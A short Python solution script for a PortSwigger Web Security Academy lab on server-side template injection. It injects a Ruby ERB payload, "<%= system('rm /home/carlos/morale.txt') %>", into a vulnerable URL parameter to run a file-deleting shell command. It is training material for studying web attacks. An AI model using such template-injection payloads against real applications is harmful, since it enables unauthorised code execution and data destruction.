#!/usr/bin/env python

'''This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

Lab link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
'''

import requests


lab_id = '0a5f001b0357ec9880d31ce600540071' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/?message=" # The message param is vulnerable to SSTI

payload = "<%= system('rm /home/carlos/morale.txt') %>" # Ruby ERB template unsandboxed payload for deleting files

r = requests.get(uri + payload)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")
